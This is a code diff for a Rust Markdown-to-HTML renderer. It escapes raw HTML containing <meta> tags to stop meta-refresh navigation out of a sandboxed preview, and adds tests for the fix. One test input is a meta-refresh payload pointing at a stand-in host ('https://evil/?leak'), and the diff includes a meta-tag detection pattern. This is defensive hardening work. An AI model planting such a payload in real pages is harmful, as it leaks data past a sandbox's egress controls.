@@ -105,11 +105,39 @@ pub fn md_to_html_body(src: &str, rel_base: Option<&str>) -> String {
                 id,
             })
         }
+        // Raw HTML passes through to the rendered page, where CSP constrains
+        // subresources but NOT navigation: a `<meta http-equiv="refresh">`
+        // would send the (hidden thumbnail / preview) page to an arbitrary
+        // URL with zero interaction — network egress the sandbox promises to
+        // block. Meta tags have no legitimate use inside a Markdown body, so
+        // any chunk containing one is rendered as visible text instead.
+        Event::Html(h) if contains_meta_tag(&h) => Event::Text(h),
+        Event::InlineHtml(h) if contains_meta_tag(&h) => Event::Text(h),
         other => other,
     });
     let mut out = String::new();
     pulldown_cmark::html::push_html(&mut out, mapped);
     out
+}
+
+/// Case-insensitive check for a `<meta` opening tag in a raw-HTML chunk.
+/// Chunk-level (not tag-level) on purpose: an HTML block arrives line by line,
+/// and a tag split across lines ("<meta\nhttp-equiv=…") must still be caught —
+/// escaping the line that opens the tag prevents it from ever forming. The
+/// character AFTER "<meta" must end the tag name (whitespace, '>', '/', or
+/// the chunk boundary), so SVG's legitimate `<metadata>` element passes.
+fn contains_meta_tag(h: &str) -> bool {
+    let lower = h.to_ascii_lowercase();
+    let mut from = 0;
+    while let Some(i) = lower[from..].find("<meta") {
+        let rest = &lower[from + i + 5..];
+        match rest.chars().next() {
+            None => return true, // tag opens at the chunk boundary
+            Some(c) if c.is_ascii_whitespace() || c == '>' || c == '/' => return true,
+            _ => from += i + 5,
+        }
+    }
+    false
 }
 
 /// A URL that should resolve relative to the document (no scheme, not absolute).
@@ -142,4 +170,52 @@ fn encode_rel_path(p: &str) -> String {
         .map(|s| utf8_percent_encode(s, SEGMENT).to_string())
         .collect::<Vec<_>>()
         .join("/")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::md_to_html_body;
+
+    #[test]
+    fn meta_refresh_is_neutralized_to_text() {
+        let out = md_to_html_body(
+            "before\n\n<meta http-equiv=\"refresh\" content=\"0;url=https://evil/?leak\">\n\nafter",
+            None,
+        );
+        assert!(!out.contains("<meta"), "meta tag must not survive: {out}");
+        assert!(
+            out.contains("&lt;meta"),
+            "must render as escaped text: {out}"
+        );
+
+        // Case variants and a tag split across HTML-block lines
+        let out = md_to_html_body("<META HTTP-EQUIV=refresh content=1>", None);
+        assert!(!out.to_ascii_lowercase().contains("<meta"));
+        let out = md_to_html_body("<meta\nhttp-equiv=\"refresh\" content=\"0;url=x\">", None);
+        assert!(!out.to_ascii_lowercase().contains("<meta"));
+
+        // Inline position too
+        let out = md_to_html_body("text <meta http-equiv=refresh content=1> more", None);
+        assert!(!out.to_ascii_lowercase().contains("<meta"));
+    }
+
+    #[test]
+    fn benign_raw_html_still_passes_through() {
+        let out = md_to_html_body(
+            "a <kbd>⌘K</kbd> b\n\n<details><summary>t</summary>x</details>",
+            None,
+        );
+        assert!(out.contains("<kbd>"));
+        assert!(out.contains("<details>"));
+
+        // SVG's <metadata> element must not trip the <meta detector — an
+        // escaped chunk would corrupt the whole inline SVG.
+        let svg =
+            "<svg viewBox=\"0 0 1 1\"><metadata>m</metadata><rect width=\"1\" height=\"1\"/></svg>";
+        let out = md_to_html_body(svg, None);
+        assert!(
+            out.contains("<metadata>"),
+            "metadata must pass through: {out}"
+        );
+    }
 }
